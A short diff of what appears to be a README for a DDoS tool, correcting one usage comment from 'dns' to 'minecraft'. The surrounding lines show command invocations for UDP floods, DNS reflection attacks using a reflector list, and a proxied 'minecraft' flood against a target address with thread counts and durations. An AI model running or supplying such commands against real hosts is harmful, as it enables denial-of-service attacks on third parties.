@@ -56,7 +56,7 @@ python start.py udp 1.1.1.1:53 1 3600
 # Running dns attack from 100 threads, for 3600 seconds  
 # with reflector servers from dns.txt, for 3600 seconds  
 python start.py dns 1.1.1.1:53 100 3600 dns.txt
-# Running dns attack from 1000 threads
+# Running minecraft attack from 1000 threads
 # with socks 5, for 3600 seconds  
 python start.py minecraft 1.1.1.1:53 1000 3600 5 socks5.txt
 ```
